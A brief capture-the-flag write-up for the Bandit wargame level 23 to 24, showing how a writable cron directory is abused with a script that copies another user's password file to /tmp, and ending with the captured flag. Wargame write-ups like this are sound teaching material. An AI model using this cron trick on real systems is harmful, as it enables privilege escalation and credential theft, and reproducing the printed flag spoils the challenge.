\#Bandit Level 23 → Level 24
##Objective

Exploit writable cron directory.

\##Commands Used
echo "cat /etc/bandit\_pass/bandit24 > /tmp/pass" > script.sh
chmod +x script.sh

\##Explanation

A writable cron directory allowed code execution.

I created a script that copied the password to a readable location.

\##Result

Learned cron exploitation.

Flag:gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

